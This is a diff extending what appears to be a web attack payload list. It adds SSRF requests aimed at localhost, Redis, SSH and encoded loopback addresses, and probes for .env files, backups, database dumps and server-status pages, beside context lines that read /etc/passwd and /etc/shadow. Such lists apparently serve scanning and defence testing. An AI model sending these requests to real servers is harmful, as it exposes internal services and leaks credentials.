@@ -398,6 +398,16 @@ GET /?url=gopher://127.0.0.1:6379/_INFO
 GET /?url=dict://127.0.0.1:11211/stats
 GET /?url=ftp://127.0.0.1/
 GET /?url=file:///etc/passwd
+# An application that prepends http:// needs no scheme for the attack.
+GET /?url=localhost
+GET /?url=localhost:6379
+GET /?url=127.0.0.1:22
+GET /?url=0.0.0.0
+GET /?url=0x7f000001
+GET /?url=2130706433
+GET /?url=file:/tmp/data
+GET /?url=gopher:127.0.0.1:6379
+POST /proxy body="url=localhost"
 GET /?target=http://0.0.0.0:80
 GET /?next=http://localhost/
 GET /?image=file:///etc/shadow
@@ -607,6 +617,11 @@ GET /uploads/theme.phar
 
 # --- Sensitive files and backups ---
 GET /.env
+# The same file behind a trailing slash, whitespace, or Windows separator.
+GET /.env/
+GET /.env%20
+GET /.env%09
+GET /.env%5C
 GET /.env.local
 GET /.env.production
 GET /.env.backup
@@ -637,6 +652,11 @@ GET /wp-config.php
 GET /wp-config.php.bak
 GET /config.php.bak
 GET /phpinfo.php
+GET /backup.zip
+GET /backup-site.tar.gz
+GET /database-dump.zip
+GET /server-status
+GET /server-info
 GET /php_info.php
 GET /phpinfo
 GET /phpversion.php
